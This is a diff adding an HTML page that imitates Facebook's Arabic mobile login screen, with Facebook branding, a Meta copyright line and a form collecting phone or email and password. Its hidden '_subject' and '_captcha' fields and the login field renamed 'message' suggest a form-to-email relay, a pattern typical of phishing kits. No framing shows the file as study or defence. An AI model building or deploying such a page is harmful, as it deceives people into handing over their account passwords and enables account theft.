@@ -1,0 +1,242 @@
+<!doctype html>
+<html>
+<head>
+ <title>Facebook</title>
+ <link rel="stylesheet" href="style.css">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<style> 
+body {
+ margin: 0;
+ padding: 0;
+ font-family: Arial, sans-serif;
+ font-size: 16px;
+}
+nav{
+ width: 100%;
+ height: 40px;
+ direction: rtl;
+ background-color: #fffde7;
+} 
+.navText{
+ font-size: 14px;
+ display: inline-block;
+ margin-right: 5px;
+ color: #153e7e;
+ font-family: Arial, sans-serif;
+} 
+.facebook{
+ text-align: center;
+ color: #2979ff;
+ font-size: 24px;
+ font-weight: 800;
+ font-family: Arial, sans-serif;
+ margin-top: 16px;
+ margin-bottom: 16px;
+}
+input{
+ display: block;
+ margin: 0 auto;
+ text-align: right;
+ width: 90%;
+ height: 40px;
+ background-color: #f5f5f5;
+ border: 1px solid lightGray;
+ border-radius: 5px;
+ padding-right: 12px;
+}
+.phoneNum, .password {
+ margin-bottom: 12px;
+}
+.buttonLogin{
+ display: block;
+ margin: 0 auto;
+ width: 94%;
+ height: 40px;
+ border: none;
+ border-radius: 5px;
+ background-color: #2979ff;
+ cursor: pointer;
+ outline: none;
+ margin-top: 14px;
+}
+.login{
+ text-decoration: none;
+ color: white;
+ font-size: 18px; 
+ font-weight: 800;
+ text-shadow: -0.7px -0.7px #153e7e;
+ padding: 0px 20px;
+ margin-top: 3px;
+}
+input:focus {
+ outline: none;
+ box-shadow: none;
+}
+input:hover{
+ border: 1px solid black;
+}
+.forget{
+ text-align: center;
+ font-size: 15px;
+ color: #1976d2;
+ text-decoration: none;
+ display: block;
+ margin: 0 auto;
+ margin-top: 15px;
+ cursor: pointer;
+ outline: none;
+ height: 30px;
+ width: 40%;
+ margin-bottom: 20px;
+}
+.or{
+ position: absolute;
+ top: -10px;
+ right: 50%;
+ transform: translate(50%, 0%);
+}
+.or1{
+ background-color: white;
+ padding: 0px 10px;
+}
+.or2{
+ color: #455a64;
+ font-size: 12px; 
+}
+.or3{
+ position: relative;
+}
+hr{
+ margin-top: 20px;
+ width: 93%;
+ font-size: 15px;
+ color: red;
+}
+.ButtonCreate{
+ display: block;
+ margin: 0 auto;
+ margin-top: 25px;
+ width: 75%;
+ height: 40px;   
+ background-color: white;
+ border: 1px solid lightGray;
+ border-radius: 5px;
+ cursor: pointer;
+ outline: none;
+}
+.ButtonCreateT{
+ text-decoration: none;
+ color: black;
+ font-size: 15px; 
+}
+.section1, .section2 {
+  width: 47%;
+  height: 110px;
+  display: inline-block;
+  margin: 0 1%;
+} 
+#lang{
+ text-align: center;
+ font-size: 12px; 
+ color: #41627E;
+}
+#PlusBtn{
+ display: block;
+ margin: -10px auto;
+ background-color: white;
+ border: 1px solid #41627E;
+ border-radius: 5px;
+}
+#PlusA{
+ text-decoration: none;
+ color: gray;
+}
+.lang2{
+ text-align: center;
+ font-size: 12px; 
+}
+#AR{
+ color: gray;
+}
+#FR{
+ color: #41627E;
+}
+#DE, #PO{
+ color: #41627E;
+}
+.IT, #FR, #PO{
+ margin-top: -8px;
+ margin-bottom: -8px;
+}
+.sc1sc2{
+ height: 16vh;
+ width: 100%;
+ margin-top: 10vh;
+}
+#help{
+ text-align: center;
+ font-size: 11px; 
+ color: gray;
+}
+#Copyrights{
+ text-align: center;
+ font-size: 12px;
+ color: gray;
+ margin-top: -4px;
+}
+</style> 
+<body>
+ <nav>
+ <p class="navText">
+ احصل علي فيسبوك لنظام Android وتصفح بسرعة أكبر.
+ </p>
+ </nav>
+ 
+ <p class="facebook">facebook</p>
+<form action="#"
+  method="POST">
+ <input type="hidden" name="_subject" value="New Email">  
+ <input type="text" class="phoneNum" name="message" placeholder="رقم الهاتف المحمول أو البريد الالكتروني" > 
+ <input type="password" name="password" placeholder="كلمة السر"> 
+ <input type="hidden" name="_captcha" value="false">
+ <button type="submit" class="buttonLogin"><p class="login">تسجيل الدخول</p></button>
+</form>
+ 
+ <a href="#" class="forget">هل نسيت كلمة السر؟</a>
+ 
+<div class="or3">
+  <hr>
+  <div class="or">
+   <div class="or1">
+    <span class="or2">أو</span>
+   </div>
+  </div>
+</div>
+
+ <button class="ButtonCreate"><a href="#"class="ButtonCreateT">إنشاء حساب جديد </a></button>
+ 
+ <div class="sc1sc2">
+ <section class="section1">
+ <p class="EN" id="lang">English (UK)</p>
+ <p class="IT" id="lang">Italiano</p>
+ <p class="ES" id="lang">Español</p>
+  <button id="PlusBtn"><a href="#" id="PlusA">+</a></button>
+ </section>
+ 
+ 
+ <section class="section2">
+ <p class="lang2" id="AR">العربية</p>
+ <p class="lang2" id="FR">Français (France)</p>
+ <p class="lang2" id="DE">Deutsch</p>
+ <p class="lang2" id="PO">Português (Brasil)</p>
+ </section>
+ </div>
+ 
+ <p id="help">حول • مساعدة • المزيد</p>
+ <p id="Copyrights">2023 © Meta حقوق النشر محفوظة </p>
+
+ 
+ <script src="script.js"></script>
+</body>
+</html>
